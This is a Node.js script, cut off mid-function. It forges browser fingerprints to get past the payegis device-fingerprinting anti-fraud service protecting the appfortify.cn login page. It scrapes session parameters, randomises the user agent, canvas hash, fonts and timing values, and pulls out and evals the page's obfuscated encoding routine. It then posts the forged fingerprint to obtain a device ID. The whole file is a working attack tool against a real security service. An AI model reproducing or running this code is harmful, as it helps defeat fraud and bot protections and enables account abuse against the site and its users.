#!/usr/bin/env node

var hide = false;

var print = function(msg) {
	var time = require("moment")().format("YYYY-MM-DD HH:mm:ss.SSS");
	console.log(time + " [INFO] " + msg);
}

var highlight = function(msg) {
    print("\033[32m" + msg + "\033[m")
}

var encode = function(str) {
    var v = "",
        G, a = str.length,
        Z;
    for (G = 0; G < a; G++) Z = str.charCodeAt(G),
        1 <= Z && 127 >= Z ? v += str.charAt(G) : (2047 < Z ? (v += String.fromCharCode(224 | Z >> 12 & 15), v += String.fromCharCode(128 | Z >> 6 & 63)) : v += String.fromCharCode(192 | Z >> 6 & 31), v += String.fromCharCode(128 | Z >> 0 & 63));
    return v
}

var special_base64 = function(str, base_str) {
    var e, d, g, f, m, l;
    g = str.length;
    d = 0;
    for (e = ""; d < g;) {
        f = str.charCodeAt(d++) & 255;
        if (d == g) {
            e += base_str.charAt(f>>2);
            e += base_str.charAt((f & 3)<<4);
            e += "==";
            break
        }
        m = str.charCodeAt(d++);
        if (d == g) {
            e += base_str.charAt(f>>2);
            e += base_str.charAt((f & 3)<<4 | (m & 240)>>4);
            e += base_str.charAt((m & 15)<<2);
            e += "=";
            break
        }
        l = str.charCodeAt(d++);
        e += base_str.charAt(f>>2);
        e += base_str.charAt((f & 3)<<4 | (m & 240)>>4);
        e += base_str.charAt((m & 15)<<2 | (l & 192)>>6);
        e += base_str.charAt(l & 63)
    }
    return e
}

var str_decrypt = function (a, b) {
	b = parseInt(b);
    for (var d = "", c = 0; c < a.length; c++)
        d += String.fromCharCode(((a.charCodeAt(c) - 32^31 & c) + 95 - b)%95 + 32);
    return d
}

var inflate = function(W) {
    function v() {
        this.G = this.W = 0
    }
    function G() {
        this.j = this.a = this.K = null;
        this.Z = this.V = this.o = this.N = 0
    }
    function a(W, G, K) {
        this.I = W;
        this.M = G;
        this.D = K
    }
    function Z() {
        this.next = null;
        this.v = 0;
        this.C = Array(8192);
        this.m = 0
    }
    function Y(W) {
        pb[X + w++] = W;
        if (8192 == X + w && 0 != w) {
            var G;
            null != kb ? (W = kb, kb = kb.next) : W = new Z;
            W.next = null;
            W.v = W.m = 0;
            null == q ? q = vb = W: vb = vb.next = W;
            W.v = w - X;
            for (G = 0; G < W.v; G++) W.C[G] = pb[X + G];
            w = X = 0
        }
    }
    function S(W) {
        W &= 65535;
        8190 > X + w ? (pb[X + w++] = W & 255, pb[X + w++] = W >>> 8) : (Y(W & 255), Y(W >>> 8))
    }
    function H() {
        h = (h << 5 ^ m[C + 3 - 1] & 255) & 8191;
        Sb = P[32768 + h];
        P[C & 32767] = Sb;
        P[32768 + h] = C
    }
    function V(W, G) {
        r(G[W].W, G[W].G)
    }
    function d(W, G, K) {
        return W[G].W < W[K].W || W[G].W == W[K].W && E[G] <= E[K]
    }
    function k(W, G, K) {
        var Z;
        for (Z = 0; Z < K && ib < Ob.length; Z++) W[G + Z] = Ob.charCodeAt(ib++) & 255;
        return Z
    }
    function y(W) {
        var G = yb,
            K = C,
            Z, R = c,
            v = 32506 < C ? C - 32506 : 0,
            a = C + 258,
            N = m[K + R - 1],
            V = m[K + R];
        c >= qb && (G >>= 2);
        do
            if (Z = W, m[Z + R] == V && m[Z + R - 1] == N && m[Z] == m[K] && m[++Z] == m[K + 1]) {
                K += 2;
                for (Z++; m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && m[++K] == m[++Z] && K < a;);
                Z = 258 - (a - K);
                K = a - 258;
                if (Z > R) {
                    Jb = W;
                    R = Z;
                    if (258 <= Z) break;
                    N = m[K + R - 1];
                    V = m[K + R]
                }
            }
        while ((W = P[W & 32767]) > v && 0 != --G);
        return R
    }
    function D() {
        var W, Z, K = 65536 - f - C;
        if ( - 1 == K) K--;
        else if (65274 <= C) {
            for (W = 0; 32768 > W; W++) m[W] = m[W + 32768];
            Jb -= 32768;
            C -= 32768;
            Wb -= 32768;
            for (W = 0; 8192 > W; W++) Z = P[32768 + W],
                P[32768 + W] = 32768 <= Z ? Z - 32768 : 0;
            for (W = 0; 32768 > W; W++) Z = P[W],
                P[W] = 32768 <= Z ? Z - 32768 : 0;
            K += 32768
        }
        ab || (W = k(m, C + f, K), 0 >= W ? ab = !0 : f += W)
    }
    function T(W, Z) {
        var K;
        if (!mb) {
            if (!ab) {
                n = Gb = 0;
                var G, R;
                if (0 == $b[0].G) {
                    U.K = Zb;
                    U.a = ob;
                    U.j = rb;
                    U.N = 257;
                    U.o = 286;
                    U.V = 15;
                    U.Z = 0;
                    B.K = Nb;
                    B.a = $b;
                    B.j = Lb;
                    B.N = 0;
                    B.o = 30;
                    B.V = 15;
                    B.Z = 0;
                    db.K = z;
                    db.a = null;
                    db.j = Ab;
                    db.N = 0;
                    db.o = 19;
                    db.V = 7;
                    for (R = G = db.Z = 0; 28 > R; R++) for (tb[R] = G, K = 0; K < 1 << rb[R]; K++) bb[G++] = R;
                    bb[G - 1] = R;
                    for (R = G = 0; 16 > R; R++) for (lb[R] = G, K = 0; K < 1 << Lb[R]; K++) ub[G++] = R;
                    for (G >>= 7; 30 > R; R++) for (lb[R] = G << 7, K = 0; K < 1 << Lb[R] - 7; K++) ub[256 + G++] = R;
                    for (K = 0; 15 >= K; K++) g[K] = 0;
                    for (K = 0; 143 >= K;) ob[K++].G = 8,
                        g[8]++;
                    for (; 255 >= K;) ob[K++].G = 9,
                        g[9]++;
                    for (; 279 >= K;) ob[K++].G = 7,
                        g[7]++;
                    for (; 287 >= K;) ob[K++].G = 8,
                        g[8]++;
                    O(ob, 287);
                    for (K = 0; 30 > K; K++) $b[K].G = 5,
                        $b[K].W = Rb(K, 5);
                    u()
                }
                for (K = 0; 8192 > K; K++) P[32768 + K] = 0;
                cb = nb[fb].M;
                qb = nb[fb].I;
                yb = nb[fb].D;
                Wb = C = 0;
                f = k(m, 0, 65536);
                if (0 >= f) ab = !0,
                    f = 0;
                else {
                    for (ab = !1; 262 > f && !ab;) D();
                    for (K = h = 0; 2 > K; K++) h = (h << 5 ^ m[K] & 255) & 8191
                }
                q = null;
                X = w = 0;
                3 >= fb ? (c = 2, I = 0) : (I = 2, Xb = 0);
                xb = !1
            }
            mb = !0;
            if (0 == f) return xb = !0,
                0
        }
        if ((K = A(W, 0, Z)) == Z) return Z;
        if (xb) return K;
        if (3 >= fb) for (; 0 != f && null == q;) {
            H();
            0 != Sb && 32506 >= C - Sb && (I = y(Sb), I > f && (I = f));
            if (3 <= I) if (R = e(C - Jb, I - 3), f -= I, I <= cb) {
                I--;
                do C++,
                    H();
                while (0 != --I);
                C++
            } else C += I,
                I = 0,
                h = m[C] & 255,
                h = (h << 5 ^ m[C + 1] & 255) & 8191;
            else R = e(0, m[C] & 255),
                f--,
                C++;
            R && (p(0), Wb = C);
            for (; 262 > f && !ab;) D()
        } else for (; 0 != f && null == q;) {
            H();
            c = I;
            Db = Jb;
            I = 2;
            0 != Sb && c < cb && 32506 >= C - Sb && (I = y(Sb), I > f && (I = f), 3 == I && 4096 < C - Jb && I--);
            if (3 <= c && I <= c) {
                R = e(C - 1 - Db, c - 3);
                f -= c - 1;
                c -= 2;
                do C++,
                    H();
                while (0 != --c);
                Xb = 0;
                I = 2;
                C++;
                R && (p(0), Wb = C)
            } else 0 != Xb ? e(0, m[C - 1] & 255) && (p(0), Wb = C) : Xb = 1,
                C++,
                f--;
            for (; 262 > f && !ab;) D()
        }
        0 == f && (0 != Xb && e(0, m[C - 1] & 255), p(1), xb = !0);
        return K + A(W, K + 0, Z - K)
    }
    function A(W, Z, K) {
        var G, R, v;
        for (G = 0; null != q && G < K;) {
            R = K - G;
            R > q.v && (R = q.v);
            for (v = 0; v < R; v++) W[Z + G + v] = q.C[q.m + v];
            q.m += R;
            q.v -= R;
            G += R;
            0 == q.v && (R = q, q = q.next, R.next = kb, kb = R)
        }
        if (G == K) return G;
        if (X < w) {
            R = K - G;
            R > w - X && (R = w - X);
            for (v = 0; v < R; v++) W[Z + G + v] = pb[X + v];
            X += R;
            G += R;
            w == X && (w = X = 0)
        }
        return G
    }
    function u() {
        var W;
        for (W = 0; 286 > W; W++) Zb[W].W = 0;
        for (W = 0; 30 > W; W++) Nb[W].W = 0;
        for (W = 0; 19 > W; W++) z[W].W = 0;
        Zb[256].W = 1;
        Tb = jb = gb = Ub = Hb = Ib = 0;
        zb = 1
    }
    function M(W, G) {
        for (var K = Q[G], Z = G << 1; Z <= Yb;) {
            Z < Yb && d(W, Q[Z + 1], Q[Z]) && Z++;
            if (d(W, K, Q[Z])) break;
            Q[G] = Q[Z];
            G = Z;
            Z <<= 1
        }
        Q[G] = K
    }
    function O(W, G) {
        var K = Array(16),
            Z = 0,
            R;
        for (R = 1; 15 >= R; R++) Z = Z + g[R - 1] << 1,
            K[R] = Z;
        for (Z = 0; Z <= G; Z++) R = W[Z].G,
        0 != R && (W[Z].W = Rb(K[R]++, R))
    }
    function b(W) {
        var Z = W.K,
            K = W.a,
            G = W.o,
            R, v = -1,
            a = G;
        Yb = 0;
        Qb = 573;
        for (R = 0; R < G; R++) 0 != Z[R].W ? (Q[++Yb] = v = R, E[R] = 0) : Z[R].G = 0;
        for (; 2 > Yb;) R = Q[++Yb] = 2 > v ? ++v: 0,
            Z[R].W = 1,
            E[R] = 0,
            Hb--,
        null != K && (Ib -= K[R].G);
        W.Z = v;
        for (R = Yb >> 1; 1 <= R; R--) M(Z, R);
        do R = Q[1],
            Q[1] = Q[Yb--],
            M(Z, 1),
            K = Q[1],
            Q[--Qb] = R,
            Q[--Qb] = K,
            Z[a].W = Z[R].W + Z[K].W,
            E[a] = E[R] > E[K] + 1 ? E[R] : E[K] + 1,
            Z[R].G = Z[K].G = a,
            Q[1] = a++,
            M(Z, 1);
        while (2 <= Yb);
        Q[--Qb] = Q[1];
        a = W.K;
        R = W.j;
        var G = W.N,
            K = W.Z,
            N = W.V,
            V = W.a,
            H, d, Y, S, L = 0;
        for (d = 0; 15 >= d; d++) g[d] = 0;
        a[Q[Qb]].G = 0;
        for (W = Qb + 1; 573 > W; W++) H = Q[W],
            d = a[a[H].G].G + 1,
        d > N && (d = N, L++),
            a[H].G = d,
        H > K || (g[d]++, Y = 0, H >= G && (Y = R[H - G]), S = a[H].W, Hb += S * (d + Y), null != V && (Ib += S * (V[H].G + Y)));
        if (0 != L) {
            do {
                for (d = N - 1; 0 == g[d];) d--;
                g[d]--;
                g[d + 1] += 2;
                g[N]--;
                L -= 2
            } while ( 0 < L );
            for (d = N; 0 != d; d--) for (H = g[d]; 0 != H;) R = Q[--W],
            R > K || (a[R].G != d && (Hb += (d - a[R].G) * a[R].W, a[R].W = d), H--)
        }
        O(Z, v)
    }
    function l(W, Z) {
        var G, v = -1,
            R, a = W[0].G,
            N = 0,
            d = 7,
            H = 4;
        0 == a && (d = 138, H = 3);
        W[Z + 1].G = 65535;
        for (G = 0; G <= Z; G++) R = a,
            a = W[G + 1].G,
        ++N < d && R == a || (N < H ? z[R].W += N: 0 != R ? (R != v && z[R].W++, z[16].W++) : 10 >= N ? z[17].W++:z[18].W++, N = 0, v = R, 0 == a ? (d = 138, H = 3) : R == a ? (d = 6, H = 3) : (d = 7, H = 4))
    }
    function t(W, Z) {
        var G, v = -1,
            R, a = W[0].G,
            N = 0,
            d = 7,
            H = 4;
        0 == a && (d = 138, H = 3);
        for (G = 0; G <= Z; G++) if (R = a, a = W[G + 1].G, !(++N < d && R == a)) {
            if (N < H) {
                do V(R, z);
                while (0 != --N)
            } else 0 != R ? (R != v && (V(R, z), N--), V(16, z), r(N - 3, 2)) : 10 >= N ? (V(17, z), r(N - 3, 3)) : (V(18, z), r(N - 11, 7));
            N = 0;
            v = R;
            0 == a ? (d = 138, H = 3) : R == a ? (d = 6, H = 3) : (d = 7, H = 4)
        }
    }
    function p(W) {
        var Z, G, v, R;
        R = C - Wb;
        eb[Ub] = Tb;
        b(U);
        b(B);
        l(Zb, U.Z);
        l(Nb, B.Z);
        b(db);
        for (v = 18; 3 <= v && 0 == z[Mb[v]].G; v--);
        Hb += 3 * (v + 1) + 14;
        Z = Hb + 3 + 7 >> 3;
        G = Ib + 3 + 7 >> 3;
        G <= Z && (Z = G);
        if (R + 4 <= Z && 0 <= Wb) for (r(0 + W, 3), Vb(), S(R), S(~R), v = 0; v < R; v++) Y(m[Wb + v]);
        else if (G == Z) r(2 + W, 3),
            Kb(ob, $b);
        else {
            r(4 + W, 3);
            R = U.Z + 1;
            Z = B.Z + 1;
            v = v + 1;
            r(R - 257, 5);
            r(Z - 1, 5);
            r(v - 4, 4);
            for (G = 0; G < v; G++) r(z[Mb[G]].G, 3);
            t(Zb, R - 1);
            t(Nb, Z - 1);
            Kb(Zb, Nb)
        }
        u();
        0 != W && Vb()
    }
    function e(W, Z) {
        Bb[jb++] = Z;
        0 == W ? Zb[Z].W++:(W--, Zb[bb[Z] + 256 + 1].W++, Nb[(256 > W ? ub[W] : ub[256 + (W >> 7)]) & 255].W++, Cb[gb++] = W, Tb |= zb);
        zb <<= 1;
        0 == (jb & 7) && (eb[Ub++] = Tb, Tb = 0, zb = 1);
        if (2 < fb && 0 == (jb & 4095)) {
            var G = 8 * jb,
                v = C - Wb,
                R;
            for (R = 0; 30 > R; R++) G += Nb[R].W * (5 + Lb[R]);
            if (gb < parseInt(jb / 2) && G >> 3 < parseInt(v / 2)) return ! 0
        }
        return 8191 == jb || 8192 == gb
    }
    function Kb(W, Z) {
        var G, v = 0,
            R = 0,
            a = 0,
            N = 0,
            d, H;
        if (0 != jb) {
            do 0 == (v & 7) && (N = eb[a++]),
                G = Bb[v++] & 255,
                0 == (N & 1) ? V(G, W) : (d = bb[G], V(d + 256 + 1, W), H = rb[d], 0 != H && (G -= tb[d], r(G, H)), G = Cb[R++], d = (256 > G ? ub[G] : ub[256 + (G >> 7)]) & 255, V(d, Z), H = Lb[d], 0 != H && (G -= lb[d], r(G, H))),
                N >>= 1;
            while (v < jb)
        }
        V(256, W)
    }
    function r(W, G) {
        n > hb - G ? (Gb |= W << n, S(Gb), Gb = W >> hb - n, n += G - hb) : (Gb |= W << n, n += G)
    }
    function Rb(W, G) {
        var Z = 0;
        do Z |= W & 1,
            W >>= 1,
            Z <<= 1;
        while (0 < --G);
        return Z >> 1
    }
    function Vb() {
        8 < n ? S(Gb) : 0 < n && Y(Gb);
        n = Gb = 0
    }
    var kb, q, vb, mb, pb = null,
        w, X, xb, m, Cb, Bb, P, Gb, n, Wb, h, Sb, Db, Xb, I, c, C, Jb, ab, f, yb, cb, fb, qb, Zb, Nb, ob, $b, z, U, B, db, g, Q, Yb, Qb, E, bb, ub, tb, lb, eb, jb, gb, Ub, Tb, zb, Hb, Ib, Ob, ib, rb = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0],
        Lb = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13],
        Ab = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 3, 7],
        Mb = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15],
        nb = [new a(0, 0, 0), new a(4, 4, 4), new a(4, 5, 8), new a(4, 6, 32), new a(4, 4, 16), new a(8, 16, 32), new a(8, 16, 128), new a(8, 32, 256), new a(32, 128, 1024), new a(32, 258, 4096)];
    var hb = 16;
    return function(W, Z) {
        var K, a, R, N;
        Ob = W;
        ib = 0;
        "undefined" == typeof Z && (Z = 6); (K = Z) ? 1 > K ? K = 1 : 9 < K && (K = 9) : K = 6;
        fb = K;
        ab = mb = !1;
        if (null == pb) {
            kb = q = vb = null;
            pb = Array(8192);
            m = Array(65536);
            Cb = Array(8192);
            Bb = Array(32832);
            P = Array(65536);
            Zb = Array(573);
            for (K = 0; 573 > K; K++) Zb[K] = new v;
            Nb = Array(61);
            for (K = 0; 61 > K; K++) Nb[K] = new v;
            ob = Array(288);
            for (K = 0; 288 > K; K++) ob[K] = new v;
            $b = Array(30);
            for (K = 0; 30 > K; K++) $b[K] = new v;
            z = Array(39);
            for (K = 0; 39 > K; K++) z[K] = new v;
            U = new G;
            B = new G;
            db = new G;
            g = Array(16);
            Q = Array(573);
            E = Array(573);
            bb = Array(256);
            ub = Array(512);
            tb = Array(29);
            lb = Array(30);
            eb = Array(1024)
        }
        a = Array(1024);
        for (K = ""; 0 < (R = T(a, a.length));) for (N = 0; N < R; N++) K += String.fromCharCode(a[N]);
        Ob = null;
        return K
    } (W)
}

var randomUA = function() {
	var ua_list = [
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
		"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
		"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
		"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
		"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
		"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
		"Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
	];
	return ua_list[Math.floor(Math.random() * ua_list.length)];
}

var random2dHash = function() {
	var hash = Math.floor(Math.random() * 9953852666);
	return hash;
}

var randomFonts = function() {
	var all_fonts = "Abadi MT Condensed Light;Adobe Fangsong Std;Adobe Hebrew;Adobe Ming Std;Agency FB;Arab;Arabic Typesetting;Arial Black;Batang;Bauhaus 93;Bell MT;Bitstream Vera Serif;Bodoni MT;Bookman Old Style;Braggadocio;Broadway;Calibri;Californian FB;Castellar;Casual;Centaur;Century Gothic;Chalkduster;Colonna MT;Copperplate Gothic Light;DejaVu LGC Sans Mono;Desdemona;DFKai-SB;Dotum;Engravers MT;Eras Bold ITC;Eurostile;FangSong;Forte;Franklin Gothic Heavy;French Script MT;Gabriola;Gigi;Gisha;Goudy Old Style;Gulim;GungSeo;Haettenschweiler;Harrington;Hiragino Sans GB;Impact;Informal Roman;KacstOne;Kino MT;Kozuka Gothic Pr6N;Lohit Gujarati;Loma;Lucida Bright;Lucida Fax;Magneto;Malgun Gothic;Matura MT Script Capitals;Menlo;MingLiU-ExtB;MoolBoran;MS PMincho;MS Reference Sans Serif;News Gothic MT;Niagara Solid;Nyala;Palace Script MT;Papyrus;Perpetua;Playbill;PMingLiU;Rachana;Rockwell;Sawasdee;Script MT Bold;Segoe Print;Showcard Gothic;SimHei;Snap ITC;TlwgMono;Tw Cen MT Condensed Extra Bold;Ubuntu;Umpush;Univers;Utopia;Vladimir Script;Wide Latin".split(";");
    var fonts = [];
    for(var i = 0; i < all_fonts.length; i++) {
    	if(Math.random() < 0.1) fonts.push(all_fonts[i]);
    }
    return fonts;
}

fp_data_template = {
  "ca": {
    "2dHash": random2dHash(),
    "webgl": {}
  },
  "ts": {
    "dt": 1452842198475,
    "sts": "1452842961624",
    "stscs": "212",
    "idts": -764151,
    "sats": 1452842198838,
    "jsrt": 363
  },
  "m": {
    "compatMode": ["CSS1Compat", "BackCompat"][Math.round(Math.random())]
  },
  "fl": "",
  "fo": randomFonts(),
  "pr": false,
  "n": {
    "appCodeName": "Mozilla",
    "appName": "Netscape",
    "appVersion": "5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.3.5 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.5",
    "language": "zh-cn",
    "userAgent": randomUA(),
    "platform": "MacIntel",
    "product": "Gecko",
    "productSub": "20030107",
    "vendor": "Apple Computer, Inc.",
    "vendorSub": "",
    "cookieEnabled": true,
    "onLine": true,
    "doNotTrack": "1",
    "javaEnabled": false,
    "enumerationOrder": [
      "appCodeName",
      "appName",
      "appVersion",
      "language",
      "userAgent",
      "platform",
      "plugins",
      "mimeTypes",
      "product",
      "productSub",
      "vendor",
      "vendorSub",
      "cookieEnabled",
      "onLine",
      "geolocation",
      "doNotTrack",
      "javaEnabled",
      "getStorageUpdates"
    ]
  },
  "p": [
    {
      "name": "WebKit 内建 PDF",
      "filename": "",
      "description": "",
      "mimeTypes": [
        {
          "description": "便携文稿格式",
          "suffixes": "pdf",
          "type": "application/pdf"
        },
        {
          "description": "便携文稿格式",
          "suffixes": "pdf",
          "type": "text/pdf"
        },
        {
          "description": "PostScript",
          "suffixes": "ps",
          "type": "application/postscript"
        }
      ]
    }
  ],
  "sl": 1,
  "s": {
    "availHeight": 733,
    "availWidth": 1430,
    "colorDepth": 24,
    "height": 900,
    "width": 1440,
    "pixelDepth": 32
  },
  "w": {
    "devicePixelRatio": 1,
    "screenTop": 48,
    "screenLeft": 29
  },
  "sc": {
    "ActiveBorder": "rgb(59, 153, 252)",
    "ActiveCaption": "rgb(0, 0, 0)",
    "AppWorkspace": "rgb(170, 170, 170)",
    "Background": "rgb(99, 99, 206)",
    "ButtonFace": "rgb(192, 192, 192)",
    "ButtonHighlight": "rgb(233, 233, 233)",
    "ButtonShadow": "rgb(159, 160, 159)",
    "ButtonText": "rgb(0, 0, 0)",
    "CaptionText": "rgb(0, 0, 0)",
    "GrayText": "rgb(127, 127, 127)",
    "Highlight": "rgb(178, 215, 255)",
    "HighlightText": "rgb(0, 0, 0)",
    "InactiveBorder": "rgb(255, 255, 255)",
    "InactiveCaption": "rgb(255, 255, 255)",
    "InactiveCaptionText": "rgb(0, 0, 0)",
    "InfoBackground": "rgb(251, 252, 197)",
    "InfoText": "rgb(0, 0, 0)",
    "Menu": "rgb(246, 246, 246)",
    "MenuText": "rgb(255, 255, 255)",
    "Scrollbar": "rgb(170, 170, 170)",
    "ThreeDDarkShadow": "rgb(0, 0, 0)",
    "ThreeDFace": "rgb(192, 192, 192)",
    "ThreeDHighlight": "rgb(255, 255, 255)",
    "ThreeDLightShadow": "rgb(255, 255, 255)",
    "ThreeDShadow": "rgb(0, 0, 0)",
    "Window": "rgb(236, 236, 236)",
    "WindowFrame": "rgb(170, 170, 170)",
    "WindowText": "rgb(0, 0, 0)"
  },
  "tz": -480,
  "lil": "",
  "wil": "",
  "si": "0144D27458347BCE0132617566522247",
  "h": "http:appfortify.cnlogin",
  "ss": {}
}

var ua = randomUA();
print("random ua: " + ua);

var request = require("request").defaults({jar: true});

var location = 'http://appfortify.cn/login'
var options = {
  url: location,
  headers: {
  	'Cache-Control': 'max-age=0',
	'Connection': 'keep-alive',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'zh-cn',
    'User-Agent': ua
  }
};

// 访问登陆页
request.get(options, function(error, response, body) {
	print('open: ' + location);
	var group = body.match(/dpa\.js\?appId=(\d+)&sessionId=(\w+)&ts=(\d+)&eid=/);
	var appId = group[1], sessionId = group[2], ts = group[3];
	print('appId: ' + appId + ' sessionId: ' + sessionId + ' ts: ' + ts);
	options = {
		url: 'http://pws.payegis.com.cn/did/js/dpa.js?appId=' + appId + '&sessionId=' + sessionId + '&ts=' + ts + '&eid=lock-area',
		headers: {
			'Referer': location,
		  	'Cache-Control': 'max-age=0',
			'Connection': 'keep-alive',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'zh-cn',
		    'User-Agent': ua
		}
	};
	// 访问dpa.js
	request.get(options, function(error, response, body) {
	print('downloaded: ' + options.url);
		options = {
			url: "http://pws.payegis.com.cn/did/fp/payegisIfm.jsp?appId=" + appId + "&sessionId=" + sessionId + "&ts=" + ts + "&rid=" + Math.random() + "&host=" + encodeURIComponent(location),
			headers: {
				'Referer': location,
				'Connection': 'keep-alive',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'zh-cn',
			    'User-Agent': ua
			}
		};
		// 访问payegisIfm.jsp
		request.get(options, function(error, response, body) {
			try{
				print('downloaded: ' + options.url);
				var sts = body.match(/Number\(\"(\d+)\"\)/)[1],
					stscs = body.match(/\(\(\*t,\",20\)\]=\"(\d+)\"/)[1];
				var fp_data = fp_data_template;
				fp_data.ca["2dHash"] = random2dHash();
				print("random canvas 2dHash: " + (hide ? "[hide]" : fp_data.ca["2dHash"]));
				fp_data.m.compatMode = ["CSS1Compat", "BackCompat"][Math.round(Math.random())];
				print("random document compatMode: " + (hide ? "[hide]" : fp_data.m.compatMode));
				fp_data.fo = randomFonts();
				print("random fonts: " + (hide ? "[hide]" : JSON.stringify(fp_data.fo)));
				fp_data.si = sessionId;
				fp_data.h = location.replace(/\//g, "");
				var sats = new Date().getTime() + Math.round(300000 * Math.random()) - 150000,
					jsrt = Math.round(Math.random() * 100) + 100,
					dt = sats - jsrt,
					idts = dt - sts - Math.round(Math.random() * 100);
				fp_data.ts = {
					"dt": dt,
					"sts": sts,
					"stscs": stscs,
					"idts": idts,
					"sats": sats,
					"jsrt": jsrt
				};
				print("random time data: " + (hide ? "[hide]" : JSON.stringify(fp_data.ts)));
				print("random fp data: " + (hide ? "[hide]" : JSON.stringify(fp_data)));
				var rtn_matcher = body.match(/return \w+\+\w+\+\w+\}/),
					end = rtn_matcher.index + rtn_matcher[0].length,
					start = body.substring(0, end).lastIndexOf("function"),
					func = body.substring(start, end);
				print("base64 encryption: " + (hide ? func.substring(0, func.indexOf("{")) + "{[hide]}" : func));
				var base_str_matcher = func.match(/var \w+=\w+(.*?),\w+=\w+,\w+=\w+,\w+,\w+/),
					base_str = eval("str_decrypt" + base_str_matcher[1]);
				print("base string: " + base_str);
				var prefix_var_matcher = func.match(/,\w+=(\w+)/),
					prefix_var = prefix_var_matcher[1];
				var prefix_matcher = body.match(eval('/\\b' + prefix_var + '=(.*?);/')),
					prefix = eval(prefix_matcher[1]);
				print("prefix string: " + prefix);
				var fp = prefix + special_base64(inflate(encode(JSON.stringify(fp_data))), base_str) + 1;
				print("fp: " + (hide ? "[hide]" : fp));
				var dp_options = {
					url: "http://pws.payegis.com.cn/did/rest/device/devicePrint",
					form: {
						fp: fp
					},
					headers: {	
						'Referer': options.url,
						'Origin': 'http://pws.payegis.com.cn',
						'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
						'Connection': 'keep-alive',
						'Accept': '*/*',
						'Accept-Language': 'zh-cn',
					    'User-Agent': ua,
					    'x-hmac-auth-date': sts,
					    'x-hmac-auth-signature': appId + ":" + sessionId
					}
				};
				// 上传设备指纹数据
				print("devicePrint ...");
				request.post(dp_options, function(error, response, body) {
					highlight("device id: " + body);
					var randomInt = function(top) {
        				return Math.floor(Math.random() * (top + 1))
    				};
				    var base64 = function(str) {
